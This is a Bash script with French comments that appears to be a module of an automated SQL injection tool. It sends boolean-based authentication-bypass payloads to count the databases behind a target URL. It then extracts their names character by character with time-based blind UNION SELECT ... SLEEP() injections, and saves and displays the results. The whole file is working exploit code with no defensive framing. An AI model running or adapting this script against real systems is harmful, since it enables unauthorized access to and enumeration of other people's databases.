#!/bin/bash

# Chargement des configurations globales
source "$(dirname "${BASH_SOURCE[0]}")/../config/globals.sh"

# Stockage des résultats
declare -A FOUND_DATABASES

# Fonction pour l'extraction des bases de données
extract_databases() {
    sql_log "INFO" "Démarrage de l'extraction des bases de données"
    local count=0
    
    # Phase 1: Détection du nombre de bases
    sql_log "QUERY" "Détection du nombre de bases de données..."
    for val in $(seq 1 $MAX_ATTEMPTS); do
        loading_animation "Test avec COUNT = $val"
        
        local payload="' OR (SELECT COUNT(*) FROM INFORMATION_SCHEMA.SCHEMATA)=${val};-- -"
        local response=$(send_request "$payload")
        local message=$(echo "$response" | jq -r '.message // empty')
        
        if [[ "$message" == *"Authentification réussie"* ]]; then
            count=$val
            sql_log "INFO" "Nombre de bases détecté : $count"
            break
        fi
        sleep $REQUEST_DELAY
    done

    if [[ $count -eq 0 ]]; then
        sql_log "ERROR" "Impossible de déterminer le nombre de bases"
        return 1
    fi

    # Phase 2: Extraction des noms
    for offset in $(seq 0 $((count - 1))); do
        sql_log "QUERY" "Extraction de la base $((offset + 1))/$count"
        local base_name=""

        for position in $(seq 1 $MAX_LENGTH); do
            local found=false

            for char in $(echo -n "$CHARSET" | sed 's/\(.\)/\1 /g'); do
                loading_animation "Test position $position avec '$char'"
                
                local injection="' UNION SELECT CASE WHEN (SUBSTRING((SELECT SCHEMA_NAME FROM INFORMATION_SCHEMA.SCHEMATA LIMIT 1 OFFSET ${offset}), ${position}, 1) = '${char}') THEN SLEEP(${THRESHOLD}) ELSE NULL END, NULL, NULL-- -"
                local duration=$(test_injection "$injection")

                if (( $(echo "$duration > $THRESHOLD" | bc -l) )); then
                    base_name+="$char"
                    sql_log "INFO" "Caractère trouvé: $char"
                    found=true
                    break
                fi
            done

            if [ "$found" = false ]; then
                break
            fi
            sleep $REQUEST_DELAY
        done

        if [ -n "$base_name" ]; then
            FOUND_DATABASES[$offset]=$base_name
            sql_log "INFO" "Base $((offset + 1)) : $base_name"
        fi
    done

    # Sauvegarde des résultats
    save_databases_results
    
    # Affichage du résumé
    display_databases_summary
}

# Fonction pour sauvegarder les résultats
save_databases_results() {
    local result_file="databases_$(date '+%Y%m%d_%H%M%S').txt"
    {
        echo "Résultats de l'extraction des bases - $(date '+%Y-%m-%d %H:%M:%S')"
        echo "URL cible: $TARGET_URL"
        echo "----------------------------------------"
        echo "ID | Nom de la base"
        echo "----------------------------------------"
        for i in "${!FOUND_DATABASES[@]}"; do
            echo "$((i + 1)) | ${FOUND_DATABASES[$i]}"
        done
        echo "----------------------------------------"
        echo "Total: ${#FOUND_DATABASES[@]} bases trouvées"
    } > "$result_file"

    sql_log "INFO" "Résultats sauvegardés dans $result_file"
}

# Fonction pour afficher le résumé
display_databases_summary() {
    echo -e "\n${BLUE}"
    echo "╔═══════════════════════════ BASES DE DONNÉES ═══════════════════════════╗"
    echo "║                                                                         ║"
    printf "║  %-3s │ %-55s ║\n" "ID" "Nom de la base"
    echo "║═════╪═════════════════════════════════════════════════════════════════║"
    
    for i in "${!FOUND_DATABASES[@]}"; do
        printf "║  %-3d │ %-55s ║\n" "$((i + 1))" "${FOUND_DATABASES[$i]}"
    done
    
    echo "║                                                                         ║"
    printf "║  Total: %-3d bases trouvées                                             ║\n" "${#FOUND_DATABASES[@]}"
    echo "╚═════════════════════════════════════════════════════════════════════════╝"
    echo -e "${DEFAULT}"
}

# Si le script est exécuté directement
if [[ "${BASH_SOURCE[0]}" == "${0}" ]]; then
    # Vérification que la configuration est chargée
    if [[ -z "$TARGET_URL" ]]; then
        echo "Erreur: Configuration non chargée"
        exit 1
    fi
    
    extract_databases
fi
